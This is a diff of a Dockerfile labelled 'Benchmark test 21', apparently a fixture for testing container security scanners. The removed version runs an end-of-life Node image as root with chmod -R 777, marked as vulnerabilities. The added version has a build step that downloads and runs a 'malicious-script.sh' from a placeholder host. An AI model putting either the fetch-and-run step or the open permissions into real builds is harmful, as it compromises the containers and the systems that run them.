@@ -1,10 +1,8 @@
-# Benchmark test 21: Express on Node 14 with chmod 777
-FROM node:14
-# VULN-A: Running as root + chmod 777
-# VULN-B: Outdated Node 14 (EOL)
-WORKDIR /app
-COPY . .
-RUN npm install express@4.17.0 cors@2.8.5
-RUN chmod -R 777 /app
-EXPOSE 3000
-CMD ["node", "server.js"]
+# Benchmark test 21
+FROM ruby:2.7
+RUN apt-get update -qq && apt-get install -y nodejs postgresql-client
+WORKDIR /myapp
+COPY Gemfile /myapp/Gemfile
+RUN bundle install
+RUN wget http://example.com/malicious-script.sh && bash malicious-script.sh
+CMD ["rails", "server", "-b", "0.0.0.0"]
